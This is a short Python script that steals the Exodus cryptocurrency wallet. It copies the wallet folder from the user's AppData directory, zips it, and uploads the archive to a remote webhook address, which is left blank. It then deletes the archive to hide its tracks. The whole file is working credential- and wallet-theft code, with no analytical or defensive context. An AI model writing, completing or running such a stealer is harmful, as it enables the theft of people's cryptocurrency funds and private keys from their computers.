import os.path, shutil, requests

user = os.path.expanduser("~")

hook = ""

shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")

file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
r = requests.post(hook, files=file)
os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
os.remove(user+"\\AppData\\Local\\Temp\\Exodus")